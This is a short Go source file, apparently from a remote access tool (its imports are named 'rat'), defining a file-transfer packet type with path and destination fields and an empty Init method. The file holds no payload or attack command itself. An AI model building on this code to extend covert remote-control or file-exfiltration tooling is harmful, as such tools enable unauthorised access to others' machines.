package main

import (
	"rat/shared"
	"rat/shared/network/header"
)

type FilePacket struct {
	Task        shared.FileTask `network:"send"`
	Path        string          `network:"send"`
	Destination string          `network:"send"`
}

func (packet FilePacket) Header() header.PacketHeader {
	return header.FileHeader
}

func (packet FilePacket) Init(c *Client) {

}
